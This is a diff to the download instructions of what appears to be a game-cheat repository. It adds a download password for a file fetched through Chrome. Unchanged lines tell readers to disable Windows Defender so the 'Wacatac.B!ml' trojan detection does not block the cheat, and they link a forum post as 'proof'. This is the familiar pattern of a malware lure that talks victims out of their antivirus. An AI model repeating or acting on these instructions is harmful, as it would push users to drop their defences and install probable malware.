@@ -1,5 +1,7 @@
 -------------------------------------------------------------HOW TO DOWNLOAD------------------------------------------------------------------------
-	
+If you download the Cheat on Google Chrome the code is:	Bdhx69M8F48b
+And click download the file.
+
 Disable windows defender to avoid this “Wacatac.B!ml” error 
 when downloading the cheat present in the "main" file 
 proof here: (https://forum.malekal.com/viewtopic.php?t=68232)
